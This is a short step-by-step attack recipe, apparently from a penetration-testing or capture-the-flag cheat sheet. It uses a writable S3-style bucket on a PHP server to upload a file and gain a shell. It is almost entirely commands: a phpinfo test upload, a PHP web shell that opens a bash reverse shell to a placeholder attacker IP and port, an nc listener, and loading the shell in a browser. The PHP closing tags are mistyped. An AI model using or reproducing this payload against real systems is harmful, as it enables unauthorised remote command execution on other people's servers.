### Requirements: The server runs php.

### Steps:

#### 1) echo '<?php phpinfo();?<' > test.php 

#### 2) aws --endpoint-url=http://s3.DOMAIN.com s3 cp test.php s3://BUCKET_NAME (These 2 commands will verify if the server actually runs php)

### If yes then:

#### 3) echo "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/OUR_IP/PORT 0>&1 \"');?< > shell.php

#### 4) aws --endpoint-url=http://s3.DOMAIN.com s3 cp shell.php s3://BUCKET_NAME (Create a php reverse shell, then upload it to the server)

#### 5) Setup listener nc -lvnp PORT

#### 6) Browse to http://DOMAIN.com/shell.php
